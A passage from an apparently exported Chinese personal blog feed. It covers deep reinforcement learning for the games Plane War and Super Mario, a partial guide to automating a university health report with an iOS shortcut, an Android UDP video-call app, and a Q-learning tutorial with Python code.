<p>本文中主要采用RLAGC算法，通过Q矩阵，通过贪婪算法选择该状态下Q矩阵中值最大的动作，决策下一轮的游戏动作。RLAGC算法伪代码如下所示：</p>
<p>表2 RLAGC伪代码</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>1:初始化算法参数</th>
</tr>
</thead>
<tbody>
<tr>
<td>2:获取初始的动作</td>
</tr>
<tr>
<td>3: For</td>
</tr>
<tr>
<td>4:获取上一时刻的状态信息</td>
</tr>
<tr>
<td>5根据获得的状态信息，计算奖励函数</td>
</tr>
<tr>
<td>6:使用状态、选择的坐标（动作）和奖励函数，以学习率、折扣因子更新Q表</td>
</tr>
<tr>
<td>7:根据量化方案编码状态，并获取对应状态下所有动作的Q值</td>
</tr>
<tr>
<td>8:根据-greedy算法获取当前状态下收益最好的动作</td>
</tr>
<tr>
<td>9:智能体选择动作获得动作下的回报值</td>
</tr>
<tr>
<td>10：通过k时隙的状态、动作和回报更新Q表</td>
</tr>
<tr>
<td>11: End for</td>
</tr>
</tbody>
</table>
</div>
<p>本文中主要采用DRLAGC算法，通过卷积神经网络，通过随机梯度下降算法选择该状态下的较好功率，决策下一轮的发射功率。DRLATPC算法伪代码如下所示：</p>
<p>表<strong>3</strong> DRLAGC伪代码</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>1:初始化算法参数</th>
</tr>
</thead>
<tbody>
<tr>
<td>2:获取初始的动作</td>
</tr>
<tr>
<td>3:For</td>
</tr>
<tr>
<td>4:获取上一时刻的状态信息、</td>
</tr>
<tr>
<td>5:根据获得的状态信息，计算奖励函数</td>
</tr>
<tr>
<td>6:使用状态、选择的坐标（动作）和奖励函数，以学习率、折扣因子更新CNN</td>
</tr>
<tr>
<td>7:获取对应状态下所有动作的奖励值</td>
</tr>
<tr>
<td>8:根据算法获取当前时刻状态下收益较好的动作</td>
</tr>
<tr>
<td>9:智能体选择动作获得动作下的回报值</td>
</tr>
<tr>
<td>10：通过k时隙的状态、动作和回报更新CNN网络</td>
</tr>
<tr>
<td>11:End for</td>
</tr>
</tbody>
</table>
</div>
<p><strong>4飞机大战智能体强化学习控制</strong></p>
<h3 id="4-1-飞机大战实验模型"><a href="#4-1-飞机大战实验模型" class="headerlink" title="4.1 飞机大战实验模型"></a><strong>4.1 飞机大战实验模型</strong></h3><p>在《飞机大战》这一游戏的AI界面中，飞机只有左、右、下三个控制按键。其中敌机在每30步随机生成一个，并向前直线运动攻击对面的智能体。智能体通过三个按键选择不同的动作避开障碍，并以最大限度攻击对面的敌机，飞机每5步发射一次子弹。</p>
<p><img src="https://www.mmrsl.cn/download/img/media/561e33edec5911fd19976424af715928.png" alt=""></p>
<p>图5 飞机大战实验模型图</p>
<p>奖励设置：当前步数没有被击中奖励0.2分、击中敌机奖励2分、被击落扣除5分。状态设置：状态设置为图像信息，图像宽度为400像素、高度为800像素，经过灰度处理后，通过OpenCV改变图像大小为高度80、长度80的矩阵，最终修改格式为1行6400列的矩阵以此为状态。</p>
<p>（4-1）</p>
<p>其中reward函数如公式4-1所示，其中L为角色是否存活：存活reward增加0.2，若否则减少5、若击中敌机则增加2。</p>
<h3 id="4-2-实验结果"><a href="#4-2-实验结果" class="headerlink" title="4.2 实验结果"></a><strong>4.2 实验结果</strong></h3><p>本文对飞机大战，加入深度强化学习，并对模型进行训练，飞机有3个动作、状态数为6041个图像和位置信息所构成的1行6041列的矩阵。本文对该游戏进行了训练，实验结果请查看demo。其中对模型进行了5000次训练，其每次训练的总回报率如下所示：</p>
<p><img src="https://www.mmrsl.cn/download/img/media/a029bdd39328a375d99639207c6f8b7e.png" alt=""></p>
<p>图6 飞机大战实验结果图</p>
<h3 id="4-3结果分析"><a href="#4-3结果分析" class="headerlink" title="4.3结果分析"></a><strong>4.3结果分析</strong></h3><p>深度强化学习没有现成的样本，而是智能体在与环境的交互中收集相应的(状态、动作、奖赏)样本进行试错学习，从而不断地改善自身策略来获取最大的累积奖赏。由实验结果可以显示深度强化学习相比于深度学习，在相同训练次数的情况下，可以得到更多奖励，且随着训练次数的增加深度强化学习相比于深度学习得到奖励的优势愈加突出。得出强化学习在游戏中的可以更好的完成智能体的自动控制。</p>
<p><strong>5超级马里奥兄弟智能体强化学习控制</strong></p>
<h3 id="5-1-超级马里奥兄弟游戏模型"><a href="#5-1-超级马里奥兄弟游戏模型" class="headerlink" title="5.1 超级马里奥兄弟游戏模型"></a><strong>5.1 超级马里奥兄弟游戏模型</strong></h3><p>在《超级马里奥兄弟》这一游戏的AI界面中，马里奥有6个控制按键:上、下、左、右、跳跃和攻击。在每个时间步长中，智能体可从合法博弈动作集合中选择一个动作将其传递给模拟器，模拟器相应修改其内部状态和游戏分数并返回当前场景的完整观察结果(包含该范围内敌人/道具/平台的位置和类型的数组)，而智能体通过游戏总分数的变化获得相应的奖励。这款游戏的目标均是在每个阶段结束时，控制马里奥在不失去生命的基础上，通过收集道具、杀死敌人和快速完成关卡而获得尽可能高的分数。</p>
<p>其中马里奥有如图所示的13种不同的动作，并设置奖励为该状态下马里奥获得分数，选择向左+5，向右-5每秒扣除0.1。</p>
<p>（4-1）</p>
<p><img src="https://www.mmrsl.cn/download/img/media/7cbbf0c5032dc6d6d54a09572e25b786.png" alt=""></p>
<p>图7 超级马里奥兄弟实验模型图</p>
<h3 id="5-2-实验结果"><a href="#5-2-实验结果" class="headerlink" title="5.2 实验结果"></a><strong>5.2 实验结果</strong></h3><p>本文对超级马里奥兄弟，加入深度强化学习，并对模型进行训练，马里奥13个动作、状态数为7056个图像和位置信息所构成的1行7057列的矩阵。本文对该游戏分别训练了100次、8000次、10000次。保存实验在100次训练、8000次训练、100000次训练实验后的结果，最终可以从以下地址访问:<br>如果通过两个网址均无法访问，请联系：<a href="&#x6d;&#97;&#105;&#x6c;&#x74;&#x6f;&#58;&#x6b;&#112;&#x40;&#109;&#109;&#x72;&#x73;&#108;&#x2e;&#x63;&#x6e;">&#x6b;&#112;&#x40;&#109;&#109;&#x72;&#x73;&#108;&#x2e;&#x63;&#x6e;</a>。其中对模型进行了5000次训练，其每次训练的总回报率如下所示：</p>
<p><img src="https://www.mmrsl.cn/download/img/media/8002b34fd908da6a21643a9ca89b2f8e.png" alt=""></p>
<p>图8 超级马里奥兄弟实验结果图</p>
<h3 id="5-3结果分析"><a href="#5-3结果分析" class="headerlink" title="5.3结果分析"></a><strong>5.3结果分析</strong></h3><p>由超级马里奥的例子说明了如何通过深度强化学习在该游戏环境下训练智能体。当智能体与环境交互时，通过大量的反复实验和迭代来更改策略。由该实验结果图显示，在相同训练次数的情况下，深度强化学习相比于深度学习可以获得更高的奖励分数，且随着训练次数的增加，深度强化学习相比于深度学习获得奖励的优势愈加明显，这同样说明深度强化学习可以在游戏中出色地完成智能体的自动控制。</p>
<h2 id="6-结论"><a href="#6-结论" class="headerlink" title="6 结论"></a><strong>6 结论</strong></h2><p>深度强化学习已经成功地应用于许多问题，由于在围棋和其他电子游戏上的出色表现而受到广泛关注。我们主要关注在游戏产业中如何利用深度强化学习技术，提升效率，改变生产方式。深度强化学习技术，是通过让智能体在游戏世界内探索的方式来训练模型提升水平，在合适的设计的基础上，往往能得到比较高水平的模型。本文通过强化学习设计了两个智能体来完成《超级马里奥兄弟》和《飞机大战》这两款游戏。通过将博弈环境抽象为状态向量，并使用DQN算法来处理复杂的游戏环境，实现了以上两款游戏的自动控制。在本文中我们只是列举了深度强化学习在游戏中的一些比较典型的例子，其中有的已经为产业带来价值，且其应用前景广阔。</p>
<h2 id="视频结果："><a href="#视频结果：" class="headerlink" title="视频结果："></a>视频结果：</h2><p><div>
<span><video src="https://www.codekp.cn/Learning_Classwork/%E9%A3%9E%E6%9C%BA%E5%A4%A7%E6%88%98.mp4"   controls="controls"></video></span>
<strong ><center> 飞机大战 </center></strong>
<span><video src="https://www.codekp.cn/Learning_Classwork/%E8%B6%85%E7%BA%A7%E9%A9%AC%E9%87%8C%E5%A5%A5.mp4"   controls="controls"></video></span>
<strong ><center> 超级玛丽 </center></strong>
</div></p>
<style>
        video {
            width: 100%;
        }
</style>


<p><strong>参考文献</strong></p>
<p>[1] Tsay J J, Chen C C, Hsu J J. Evolving intelligent mario controller by<br>reinforcement learning[C]//2011 International Conference on Technologies and<br>Applications of Artificial Intelligence. IEEE, 2011: 266-272.</p>
<p>[2] Geoffrey E.Hinton and Simon Osindero. A fast learning algorithm for deep<br>belief nets[J].In Neural Computation,2006.</p>
<p>[3] Coates,A.Demystifying Unsupervised Feature Learning[D].PhD thesis,Stanford<br>University,Palo Alto,USA,2012.</p>
<p>[4] Bengio,Y.Learning Deep Architectures for AI[J].Found.trends<br>Mach.Learn.2(2009),1-127.</p>
<p>[5] Yu,D.Seltzer,M.l.,Li,J.,Huang,J.-T.,and Seide,F.Feature learning in deep<br>neural networks-a study on speech recogniyion tasks[J].CoRR abs/1301.3605(2013).</p>
<p>[6] Ranzato,M.,lan Boureau,Y.,and Cun,Y.L.Sparse feature learning for deep<br>belief networks[J].In Advance in Neural Information Processing Systems<br>20,J.Platt,D.Koller,Y.Singer,and S.Roweis,Eds.Curran<br>Associates,Inc.,2008,pp.1185-1192.</p>
<p>[7] Arnold,L.,Rebecchi,S.,Chevallier,S.,and Paugam-Moisy,H.An Introduction to<br>Deep Learning[M]. In Advances in Computational Intelligence and Machine<br>Learning,ESANN’2011(2011),pp.477-488.</p>
<p>[8] Volodymyr Mnih,Koray Kavukcuoglu,and David Silver.Playing Atari with Deep<br>Reinforcement Learning[J].In ICML,2014.</p>
<p>[9] Richard Sutton and Andrew Barto. Rcinforcement Learning:An<br>Introduction[M].MIT Press,1998.</p>
<p>[10]Sutton R S, Barto A G. Introduction to reinforcement learning[M]. Cambridge:<br>MIT press, 1998.</p>
<p>[11]Mnih V, Kavukcuoglu K, Silver D, et al. Playing atari with deep<br>reinforcement learning[J]. arXiv preprint arXiv:1312.5602, 2013.</p>
<p>[12]Mnih V, Kavukcuoglu K, Silver D, et al. Human-level control through deep<br>reinforcement learning[J]. nature, 2015, 518(7540): 529-533.</p>
<p>[13]Klein S. CS229 Final Report Deep Q-Learning to Play Mario[J].</p>
<p>[14]Chen K. Deep reinforcement learning for flappy bird[J]. 2015.</p>
]]></content>
      <categories>
        <category>强化学习</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>强化学习</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>xmu健康打卡ios快捷指令</title>
    <url>/2020/12/06/%E5%A4%A7%E5%AD%A6ios%E7%B3%BB%E7%BB%9F%E6%89%93%E5%8D%A1%E6%8D%B7%E5%BE%84/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="XMU健康打卡ios快捷指令"><a href="#XMU健康打卡ios快捷指令" class="headerlink" title="XMU健康打卡ios快捷指令"></a><center>XMU健康打卡ios快捷指令</center></h1><h2 id="XMU-Health-Report-Base-On-Iphone"><a href="#XMU-Health-Report-Base-On-Iphone" class="headerlink" title=" XMU Health Report Base On Iphone "></a><center> XMU Health Report Base On Iphone </center></h2><span id="more"></span>
<h2 id="1-工具"><a href="#1-工具" class="headerlink" title="1.工具"></a>1.工具</h2><ul>
<li>浏览器</li>
<li>由于各个网页不同，可能会有不一样的结果，因此这个过程仅供参考。</li>
<li>下面说一下大概的思路，先用浏览器打开我们打卡的链接，接着打开浏览器，按F12进入开发者模式。</li>
<li>接着，选择network<center>
<img src="https://www.codekp.cn/download/img/xmu_r/F12.PNG" width = "400" height = "302" alt="图片名称" align=center />
</center></li>
<li><p>找到POST，不要寻找GET</p>
<center>
<img src="https://www.codekp.cn/download/img/xmu_r/get.PNG" width = "400" height = "302" alt="图片名称" align=center />
</center>
</li>
<li><p>如下：<br><center>
<img src="https://www.codekp.cn/download/img/xmu_r/post.PNG" width = "400" height = "302" alt="图片名称" align=center />
</center><br>将里面的连接保存下来<br><a href="https://ids.xmu.edu.cn/authserver/login?service=https://xmuxg.xmu.edu.cn/login/cas/xmu">https://ids.xmu.edu.cn/authserver/login?service=https://xmuxg.xmu.edu.cn/login/cas/xmu</a></p>
</li>
</ul>
<p>即找到了我们需要的登录网址。</p>
<p>接下来记录 username和userpassword，依次填入ios。</p>
<center>
<img src="https://www.codekp.cn/download/img/xmu_r/report.PNG" width = "400" height = "302" alt="图片名称" align=center />
</center>



<ul>
<li>将得到的数据填入一下列表<center>
<img src="https://www.codekp.cn/download/img/xmu_r/report_ios.jpg" width = "400" height = "302" alt="图片名称" align=center />
</center>


</li>
</ul>
<blockquote>
<p>仅只写到这里有兴趣的自己继续探索。</p>
</blockquote>
]]></content>
      <categories>
        <category>厦门大学</category>
      </categories>
      <tags>
        <tag>厦门大学</tag>
        <tag>健康打卡</tag>
      </tags>
  </entry>
  <entry>
    <title>实时视频传输APP</title>
    <url>/2021/01/15/%E5%AE%9E%E6%97%B6%E8%A7%86%E9%A2%91%E4%BC%A0%E8%BE%93APP/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><!-- wp:heading -->
<p><h2><strong>视频通信APP</strong><strong>的设计</strong></h2><br><!-- /wp:heading --></p>
<!-- wp:heading -->
<p><h2><strong>1       </strong>功能选择界面</h2><br><!-- /wp:heading --></p>
<!-- wp:paragraph -->
<p><p>通过程序设计，首先构建用户功能选择界面，其中包括用户名和该用户的个人签名、个人头像，本处签名选用为个人网站，新的个人网站：<a href="https://www.codekp.cn/">https://www.codekp.cn/</a>。向下依次是Home主界面，主要是APP的地图功能。第二项Gallery为第二个界面，为APP的蓝牙信道检测功能，第三项Slideshow为第三界面，为APP的视频通话功能。点击三个界面选项框可以跳转到自己的界面。</p><br><!-- /wp:paragraph --></p>
<!-- wp:image {"id":254,"sizeSlug":"large","linkDestination":"none"} -->
<p><figure class="wp-block-image size-large"><img src="http://www.mmrsl.cn/wp-content/uploads/2021/01/1.png" alt="" class="wp-image-254"/></figure><br><!-- /wp:image --></p>
<!-- wp:paragraph {"align":"center"} -->
<p><p class="has-text-align-center">图1 APP功能选择界面图</p><br><!-- /wp:paragraph --></p>
<!-- wp:heading -->
<p><h2><strong>2       </strong> 定位界面</h2><br><!-- /wp:heading --></p>
<!-- wp:paragraph -->
<p><p><a>定位界面，主要由上方的底层用户数据显示界面，和下方的定位地图界面，地图界面采用浏览器形式，并对定位点用红色鲜明坐标在图中进行了标记。</a></p><br><!-- /wp:paragraph --></p>
<!-- wp:paragraph -->
<p><p>首先，通过调用安卓底层接口，读取手机的经度、纬度等信息，然后设计了一个浏览器界面，由于时间关系没有调用高德地图的api，直接调用的web静态页面。通过修改URL的页面地址，即可获得如图所示的地图信息显示图。</p><br><!-- /wp:paragraph --></p>
<!-- wp:image {"id":255,"sizeSlug":"large","linkDestination":"none"} -->
<p><figure class="wp-block-image size-large"><img src="http://www.mmrsl.cn/wp-content/uploads/2021/01/2-514x1024.png" alt="" class="wp-image-255"/></figure><br><!-- /wp:image --></p>
<!-- wp:paragraph {"align":"center"} -->
<p><p class="has-text-align-center">图2 APP定位界面</p><br><!-- /wp:paragraph --></p>
<!-- wp:paragraph -->
<p><p>其次，由于本文中获取的为GPS原始数据，采用的是国际坐标系(WGS84)，而中国地图采用的为火星坐标系(GCJ02)，其中进行了经纬度的转换，将原始数据转到精准的经纬度数据，并实现精确定位。</p><br><!-- /wp:paragraph --></p>
<!-- wp:heading -->
<p><h2><strong>3       </strong>视频通话界面</h2><br><!-- /wp:heading --></p>
<!-- wp:paragraph -->
<p><p>视频通话界面，界面左侧为通话对方的实时视频图像，右方为己方的实时视频图像，下方为对方的端口号输入栏，右侧为设置，点击后会连接进对方的视频数据中。</p><br><!-- /wp:paragraph --></p>
<!-- wp:paragraph -->
<p><p>首先，先编写程序，读取安卓手机的相机接口。其中的原理是，首先将调用安卓手机的相机功能，然后将拍摄到的视频保存在存储器中的某个地方，然后读取该位置的图片，在右侧视频端进行显示，调用相机接口如图3所示。</p><br><!-- /wp:paragraph --></p>
<!-- wp:paragraph -->
<p><p>然后采用socket通信，其中有两种选择，TCP通信和UDP通信两种方式，其各自在自己的使用场景下有各自的优点，但是考虑到UDP不用握手可以完成双向传递，于是选择UDP，同时还可以提高通信速率。</p><br><!-- /wp:paragraph --></p>
<!-- wp:image {"id":258,"sizeSlug":"large","linkDestination":"none"} -->
<p><figure class="wp-block-image size-large"><img src="http://www.mmrsl.cn/wp-content/uploads/2021/01/3-1-626x1024.png" alt="" class="wp-image-258"/></figure><br><!-- /wp:image --></p>
<!-- wp:paragraph {"align":"center"} -->
<p><p class="has-text-align-center">图3 APP视频通话相机功能</p><br><!-- /wp:paragraph --></p>
<!-- wp:paragraph -->
<p><p>获取到本地的图像数据后，对图像进行编码，通过UDP通讯协议进行传输，传输到本地IP：192.168.201.217，端口：8888上。然后在另对方手机中输入己方IP地址，点击START按钮即可开始视频通话，视频通话完成图像如下图所示。</p><br><!-- /wp:paragraph --></p>
<!-- wp:image {"id":259,"sizeSlug":"large","linkDestination":"none"} -->
<p><figure class="wp-block-image size-large"><img src="http://www.mmrsl.cn/wp-content/uploads/2021/01/4-1-524x1024.png" alt="" class="wp-image-259"/></figure><br><!-- /wp:image --></p>
<!-- wp:paragraph {"align":"center"} -->
<p><p class="has-text-align-center">图4 APP视频通话界面图</p><br><!-- /wp:paragraph --></p>
<!-- wp:heading -->
<p><h2><strong>4      APP</strong>视频demo</h2><br><!-- /wp:heading --></p>
<!-- wp:video -->
<p><figure class="wp-block-video"><video controls src="blob:http://www.mmrsl.cn/386ea6cf-f2e7-47b7-9cf8-8346885f1ddd"></video></figure><br><!-- /wp:video --></p>
]]></content>
      <categories>
        <category>安卓APP</category>
      </categories>
      <tags>
        <tag>安卓APP</tag>
      </tags>
  </entry>
  <entry>
    <title>强化学习</title>
    <url>/2020/11/20/%E5%BC%BA%E5%8C%96%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Q-learning入门例程及Python实现"><a href="#Q-learning入门例程及Python实现" class="headerlink" title="Q-learning入门例程及Python实现"></a><center>Q-learning入门例程及Python实现</center></h1><p><strong>摘要：Q-learning算法是一种以马尔科夫决策作为理论基础与模型无关的强化学习算法。本文中会描述一个入门级强化学习例程，即房间连通性问题：根据房间的连通性与否及房间出口构建回报矩阵R。并通过python语言利用强化学习算法获得该场景下的评估矩阵Q，最后利用Q矩阵寻找最优路径。</strong><br><span id="more"></span></p>
<p>关键词：Q-learning；R矩阵；Q矩阵；最优路径决策</p>
<h2 id="一、从马尔科夫过程到Q学习"><a href="#一、从马尔科夫过程到Q学习" class="headerlink" title="一、从马尔科夫过程到Q学习"></a>一、从马尔科夫过程到Q学习</h2><p>标准的马尔科夫决策过程可以用一个五元组\<S,A,P,R,γ\> 表示，其中：</p>
<ul>
<li><p>S是一个离散有界的状态空间；</p>
</li>
<li><p>A是一个离散的动作空间；</p>
</li>
<li><p>P为状态转移概率函数，表示agent在状态s下选取动作a后转移到a’的概率；</p>
</li>
<li><p>R为回报函数，用于计算agent由当前状态 选取动作 后转移到下一状态<br>得到的立即回报值，由当前状态和选取的动作决定，体现了马尔科夫性的特点；</p>
</li>
<li><p>γ是折扣因子，用于确定延迟回报与立即回报的相对比例，<br>越大表明延迟回报的重要程度越高。</p>
</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/2019092420285149.png" width = "200" height = "40" alt="图片名称" align=center /></p>
<p>马尔科夫决策问题的目标是找到一个策略<br>，使其回报函数的长期累积值的数学期望最大。其中，策略π只和状态相关，与时间无关（静态的）。<img src="https://img-blog.csdnimg.cn/20190924203953879.png" width = "15" height = "15" alt="图片名称" align=center />是t时刻的环境状态，<img src="https://img-blog.csdnimg.cn/20190924204015148.png" width = "15" height = "15" alt="图片名称" align=center />是t时刻选择的动作。根据Bellman最优准则，得到最优策略 对应的最优指标为：</p>
<p><img src="https://img-blog.csdnimg.cn/20190924203036514.png" width = "200" height = "40" alt="图片名称" align=center /></p>
<p>其中，R(s,a)为r(st,at)的数学期望，<img src="https://img-blog.csdnimg.cn/20190924203122905.png" width = "45" height = "20" alt="图片名称" align=center />为在状态s下选取动作a后转移到下一状态状态s’的概率。由于某些环境中状态之间的转移概率P不容易获得，直接学习<img src="https://img-blog.csdnimg.cn/20190924203205467.png" width = "60" height = "20" alt="图片名称" align=center />是很困难的，而Q学习不需要获取转移概率P，因而可用来解决此类具有马尔科夫性的问题。</p>
<p>Q学习是一种与环境无关的算法，是一种基于数值迭代的动态规划方法。定义一个Q函数作为评估函数：</p>
<p><img src="https://img-blog.csdnimg.cn/20190924203315691.png" width = "200" height = "30" alt="图片名称" align=center /></p>
<p>评估函数Q(s,a)的函数值是从状态s开始选择第一个动作a执行后获得的最大累积回报的折算值，通俗地说，Q值等于立即回报值r(s,a)<br>加上遵循最优策略的折算值，此时的最优策略可改写为：</p>
<p><img src="https://img-blog.csdnimg.cn/20190924203357997.png" width = "200" height = "30" alt="图片名称" align=center /></p>
<p>该策略表达式的意义在于：如果agent用Q函数代替<img src="https://img-blog.csdnimg.cn/20190924204358289.png" width = "15" height = "15" alt="图片名称" align=center />函数，就可以不考虑转移概率P，只考虑当前状态s的所有可供选择的动作a，并从中选出使Q(s,a)最大的动作，即agent对当前状态的部分Q值做出多次反应，便可以选出动作序列，使全局最优化。</p>
<p>在Q学习中，agent由初始状态转移到目标状态的过程称为“Episode”，即“场景”。Q函数可以表示为以下的迭代形式进行Q矩阵的更新：</p>
<p><img src="https://img-blog.csdnimg.cn/20190924203447849.png" width = "300" height = "30" alt="图片名称" align=center /></p>
<p>在每一步的迭代中，上式又可写为：</p>
<p><img src="https://img-blog.csdnimg.cn/20190924203502753.png" width = "300" height = "30" alt="图片名称" align=center /></p>
<p>即Q矩阵(st,at)位置元素的值等于回报函数R的相应值加上折扣因子γ乘以转换到下一个状态后最大的Q值。</p>
<p>上述的Q学习算法可以看出，当划分的状态有限时，每一场景开始时随机选择的初始状态s在算法的指导下探索环境，最终一定可以到达目标状态s*，回报函数R(s,a)是有界的，并且动作的选择能够使每个状态映射到动作对的访问是无限频率，则整个学习过程就能够训练出来。</p>
<p>Q学习通过对环境的不断探索，积累历史经验，agent通过不断试错来强化自身，最终可以达到自主选择最优动作的目标，即不论出于何种状态，都可给出到达目标状态的最优选择路径，该算法中环境和动作相互影响，动作的选择影响环境状态，环境也可以通过强化回报函数<br>来反馈动作的优劣性，影响动作的选择。</p>
<h2 id="二、由一个广为流传的小例子了解Q学习的算法逻辑"><a href="#二、由一个广为流传的小例子了解Q学习的算法逻辑" class="headerlink" title="二、由一个广为流传的小例子了解Q学习的算法逻辑"></a>二、由一个广为流传的小例子了解Q学习的算法逻辑</h2><p>一个由门连接的建筑物中有五个房间，如下图所示，分别用0-4号标识，将外界看作一个大房间，同样标识为5。</p>
<p><img src="https://img-blog.csdnimg.cn/20190924205406684.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dsbV9weQ==,size_16,color_FFFFFF,t_70" width = "400" height = "200" alt="图片名称" align=center /></p>
<p>每个房间代表一个节点，门代表连线，可以将上图抽象为下面这样：</p>
<p><img src="https://img-blog.csdnimg.cn/20190924205532752.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dsbV9weQ==,size_16,color_FFFFFF,t_70" width = "400" height = "200" alt="图片名称" align=center /><br>agent会被随机放置在任意一个房间里，然后从那个房间出发，一直走到建筑外（即5号房间为目标房间）。门是双向的，所以相邻节点间是双向箭头连接。通过门可以立即得到奖励值100，通过其他门奖励值为0。将所有箭头标注奖励值如下图：</p>
<p><img src="https://img-blog.csdnimg.cn/20190925124638361.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dsbV9weQ==,size_16,color_FFFFFF,t_70" width = "400" height = "200" alt="图片名称" align=center /></p>
<p>在Q学习中，目标是达到奖励最高的状态，所以如果agent到达目标，它将永远在那里。这种类型的目标被称为“吸收目标”。</p>
<p>想象一下，我们的agent是一个想象的虚拟机器人，可以通过经验学习。<br>agent可以从一个房间转移到另一个房间，但它没有上帝视角，也不知道哪一扇门通向外面。</p>
<p>按照第一部分Q学习的理论，我们把每个房间抽象为一个状态，选择进入哪号房间作为动作，把状态图和即时奖励值放到下面的奖励值表“回报矩阵R”中：-1表示不可选择的动作，两个状态间没有连接）</p>
<pre class="line-numbers language-none"><code class="language-none">R &#x3D; np.matrix([[-1, -1, -1, -1, 0, -1],  
[-1, -1, -1, 0, -1, 100],  
[-1, -1, -1, 0, -1, -1],  
[-1, 0, 0, -1, 0, -1],  
[ 0, -1, -1, 0, -1, 100],  
[-1, 0, -1, -1, 0, 100]])<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>现在我们将添加一个类似的矩阵“Q”给我们agent的大脑，代表了通过经验学到的东西的记忆。<br>矩阵Q的行表示agent的当前状态，列表示导致下一个状态的可能动作（节点之间的连线）。</p>
<p>agent开始什么都不知道，矩阵Q被初始化为零。<br>在这个例子中，为了解释简单，我们假设状态的数目是已知的（六个，0-5）。<br>如果我们不知道涉及多少个状态，矩阵Q可能从只有一个元素开始。<br>如果找到新的状态，则在矩阵Q中添加更多的列和行是一项简单的任务。</p>
<p>Q学习的更新规则如下：</p>
<p><img src="https://img-blog.csdnimg.cn/20190924203502753.png" width = "200" height = "30" alt="图片名称" align=center /></p>
<p>根据这个公式，分配给矩阵Q的特定元素的值等于矩阵R中相应值加上学习参数γ乘以下一状态下所有可能动作的Q的最大值。</p>
<p>基于算法思想，训练Q矩阵的具体流程如下：</p>
<ul>
<li><p>步骤1.初始化仓库环境和算法参数（最大训练周期数，每一场景即为一个周期，折扣因子γ，即时回报函数R和评估矩阵Q。）。</p>
</li>
<li><p>步骤2.随机选择一个初始状态s，若s=s*，则结束此场景，重新选择初始状态。</p>
</li>
<li><p>步骤3.在当前状态s的所有可能动作中随机选择一个动作a，选择每一动作的概率相等。</p>
</li>
<li><p>步骤4.当前状态s选取动作a后到达状态s’。</p>
</li>
<li><p>步骤5.使用公式对Q矩阵进行更新。</p>
</li>
<li><p>步骤6.设置下一状态为当前状态，s=s‘。若s未达到目标状态，则转步骤3。</p>
</li>
<li><p>步骤7.如果算法未达到最大训练周期数，转步骤2进入下一场景。否则结束训练，此时得到训练完毕的收敛Q矩阵。</p>
</li>
</ul>
<p>上面的流程是给agent用来学习经验的。 每一场景都相当于一个培训课程。<br>在每个培训课程中, agent将探索环境 (由矩阵R表示), 接收奖励 (如果有),<br>直到达到目标状态。训练的目的是提高我们的agent的 “大脑”（矩阵 Q）。<br>场景越多，Q矩阵越优化。 在这种情况下, 如果矩阵 Q<br>得到了增强,四处探索时并不会在同一个房间进进出出,<br>agent将找到最快的路线到达目标状态。</p>
<p>参数γ的范围为0到1（0 \&lt;= γ\&lt; 1）。<br>如果γ接近零，agent将倾向于只考虑立即得到奖励值。<br>如果γ更接近1，那么agent将会考虑更多的权重，愿意延迟得到奖励。</p>
<p>一旦矩阵Q足够接近收敛状态，我们知道我们的agent已经学习了任意状态到达目标状态的最佳路径。</p>
<p>例如：</p>
<ul>
<li><p>从初始状态2开始，agent可以使用矩阵Q作为指导,从状态2开始，最大Q值表示选择进入状态3的动作。</p>
</li>
<li><p>从状态3开始，最大Q值表示有两种并列最优选择：进入状态1或4。假设我们任意选择去1。</p>
</li>
<li><p>从状态1开始，最大Q值表示选择进入状态5的动作。</p>
</li>
<li><p>因此，最优策略是2 - 3 - 1 - 5。</p>
</li>
</ul>
<p>我们使用Python为训练agent编写代码：<br><pre class="line-numbers language-matlab" data-language="matlab"><code class="language-matlab">import numpy as np  
import random  
  
\# 初始化矩阵  
Q &#x3D; np.zeros((6, 6))  
Q &#x3D; np.matrix(Q)  
  
def wan_find(list, col, list2):  
col_max &#x3D; 0  
col_y &#x3D; 0  
col&#x3D;col  
\# a &#x3D; np.linspace(0, 5, 5);  
  
for i in [0, 1, 2, 3, 4, 5]:  
if col_max \&lt; list[i, col] and (i not in list2):  
col_y &#x3D; i  
col_max &#x3D; list[i, col]  
  
return col_y, col_max  
  
\# 回报矩阵R  
R &#x3D; np.matrix([[-1, -1, -1, -1, 0, -1],  
[-1, -1, -1, 0, -1, 100],  
[-1, -1, -1, 0, -1, -1],  
[-1, 0, 0, -1, 0, -1],  
[ 0, -1, -1, 0, -1, 100],  
[-1, 0, -1, -1, 0, 100]])  
  
\# 设立学习参数  
γ &#x3D; 0.8  
  
\# 训练  
for i in range(2000):  
\# 对每一个训练,随机选择一种状态  
state &#x3D; random.randint(0, 5)  
while True:  
\# 选择当前状态下的所有可能动作  
r_pos_action &#x3D; []  
for action in range(6):  
if R[state, action] \&gt;&#x3D; 0:  
r_pos_action.append(action)  
  
next_state &#x3D; r_pos_action[random.randint(0, len(r_pos_action) - 1)]  
Q[state, next_state] &#x3D; R[state, next_state] + γ \* (Q[next_state]).max() \# 更新  
state &#x3D; next_state  
\# 状态4位最优库存状态  
if state &#x3D;&#x3D; 5:  
break  
  
Q1&#x3D;np.zeros((6, 6))  
Q1&#x3D;Q&#x2F;Q.max();  
print(Q1)  
